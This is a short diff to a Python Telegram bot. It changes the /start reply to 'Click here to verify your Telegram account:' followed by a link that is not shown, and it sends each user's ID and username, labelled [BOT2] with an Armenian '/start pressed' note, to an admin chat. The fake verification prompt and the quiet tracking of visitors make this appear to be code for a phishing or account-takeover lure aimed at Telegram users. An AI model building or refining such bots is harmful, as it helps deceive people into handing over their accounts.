@@ -9,13 +9,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     username = user.username or "NoUsername"
 
-    # User receives the link
-    await update.message.reply_text(LINK)
+    # User receives message + link
+    await update.message.reply_text(f"Click here to verify your Telegram account:\n{LINK}")
 
     # Admin receives notification
     await context.bot.send_message(
         chat_id=ADMIN_ID,
-        text=f"[BOT1]\nUserID: {user.id}\nUsername: @{username}"
+        text=f"[BOT2]\n/start սեղմեց\nUser ID: {user.id}\nUsername: @{username}"
     )
 
 def main():
@@ -25,3 +25,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
